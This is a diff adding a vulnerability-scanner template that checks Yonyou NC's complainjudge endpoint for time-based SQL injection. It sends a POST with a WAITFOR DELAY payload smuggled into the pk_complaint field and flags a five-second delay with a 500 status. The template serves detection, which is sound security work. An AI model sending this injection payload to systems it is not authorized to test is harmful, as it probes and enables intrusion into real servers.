@@ -1,0 +1,30 @@
+id: yonyou-nc-complainjudge-sqli
+
+info:
+  name: Yonyou NC complainjudge - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    This template checks for SQL Injection vulnerabilities by observing response time delays.
+  reference:
+    - https://github.com/k3ppf0r/2024-PocLib/blob/f64375e23082dff16b86ab07b2f452bd7156a31d/xray_templates/xray-sqli-post.yml#L22
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /ebvp/advorappcoll/complainjudge HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:5%27--
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=5"
+      - type: status
+        status:
+          - 500
